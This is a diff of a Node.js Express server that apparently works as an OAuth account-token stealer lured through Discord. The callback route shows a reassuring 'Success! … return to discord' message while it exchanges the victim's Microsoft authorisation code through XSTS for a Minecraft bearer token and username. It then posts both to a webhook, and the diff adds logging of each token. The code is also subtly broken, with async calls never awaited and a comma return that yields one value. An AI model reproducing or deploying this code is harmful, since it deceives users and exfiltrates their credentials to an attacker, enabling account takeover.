@@ -13,14 +13,22 @@ const port = process.env.PORT || 8080
 router.get('/', (req, res) => {
     res.send('Success! You can exit this page and return to discord.')
     try {
-    const code = req.query['code']
-    const accessToken = getAccessToken(code)
-    const userHash = getUserHashAndToken(accessToken)[0]
-    const userToken = getUserHashAndToken(accessToken)[1]
-    const xstsToken = getXSTSToken(userToken)
-    const bearerToken = getBearerTokenAndUsername(xstsToken, userHash)[0]
-    const username = getBearerTokenAndUsername(xstsToken, userHash)[1]
-    postToWebhook(username, bearerToken)} catch (err) {
+        const code = req.query['code']
+        console.log(code + " - Code\n")
+        const accessToken = getAccessToken(code)
+        console.log(accessToken + " - Access Token\n")
+        const userHash = getUserHashAndToken(accessToken)[0]
+        console.log( userHash + " - User Hash\n")
+        const userToken = getUserHashAndToken(accessToken)[1]
+        console.log(userToken + " - User Token\n")
+        const xstsToken = getXSTSToken(userToken)
+        console.log(xstsToken + " - XSTS Token\n")
+        const bearerToken = getBearerTokenAndUsername(xstsToken, userHash)[0]
+        console.log(   bearerToken + " - Bearer Token\n")
+        const username = getBearerTokenAndUsername(xstsToken, userHash)[1]
+        console.log(username + " - Username\n")
+        postToWebhook(username, bearerToken)
+    } catch (err) {
         console.log("A wild error has appeared!\n" + err + "\n")
     }
 })
@@ -95,7 +103,7 @@ async function getBearerTokenAndUsername(xstsToken, userHash) {
     return response.data['access_token'], response.data['username']
 }
 
-function postToWebhook(username, bearerToken){
+function postToWebhook(username, bearerToken) {
     const url = config.webhook_url
     const headers = {
         'Content-Type': 'application/json',
